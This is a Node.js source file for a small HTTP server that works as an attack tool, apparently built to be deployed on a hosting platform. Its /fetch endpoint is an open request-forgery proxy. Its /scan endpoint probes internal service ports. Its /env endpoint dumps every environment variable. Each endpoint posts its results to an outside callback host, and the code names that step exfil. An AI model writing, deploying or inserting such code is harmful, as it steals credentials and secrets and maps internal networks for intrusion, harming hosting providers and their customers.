const http = require('http');
const https = require('https');

const PORT = process.env.PORT || 10000;
const CB_URL = 'https://secrettune.xyz/cb/render_proxy_exfil/';

async function fetchUrl(targetUrl) {
  return new Promise((resolve, reject) => {
    const mod = targetUrl.startsWith('https') ? https : http;
    const req = mod.get(targetUrl, { timeout: 5000 }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
  });
}

async function exfil(path, data) {
  return new Promise((resolve) => {
    const postData = JSON.stringify({ path, data, ts: new Date().toISOString() });
    const req = https.request(CB_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) },
      timeout: 5000
    }, () => resolve());
    req.on('error', () => resolve());
    req.write(postData);
    req.end();
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  
  if (url.pathname === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end('{"status":"ok"}');
  }
  
  if (url.pathname === '/fetch') {
    const target = url.searchParams.get('url');
    if (!target) {
      res.writeHead(400);
      return res.end('Missing url parameter');
    }
    try {
      const result = await fetchUrl(target);
      // Send to callback server
      await exfil(target, result).catch(() => {});
      // Return to caller
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify(result));
    } catch (e) {
      res.writeHead(500);
      return res.end(JSON.stringify({ error: e.message }));
    }
  }
  
  if (url.pathname === '/scan') {
    // Internal port scan + service discovery
    const host = url.searchParams.get('host') || 'localhost';
    const ports = [80, 443, 3000, 5432, 6379, 8080, 9090, 9229, 10000];
    const results = {};
    for (const port of ports) {
      try {
        const r = await fetchUrl(`http://${host}:${port}/`);
        results[port] = { status: r.status, body: r.body.substring(0, 200) };
      } catch (e) {
        results[port] = { error: e.message };
      }
    }
    await exfil(`scan:${host}`, results).catch(() => {});
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(results));
  }

  if (url.pathname === '/env') {
    // Dump own environment variables
    const envData = { ...process.env };
    await exfil('self-env', envData).catch(() => {});
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(envData));
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, () => console.log(`Proxy on :${PORT}`));
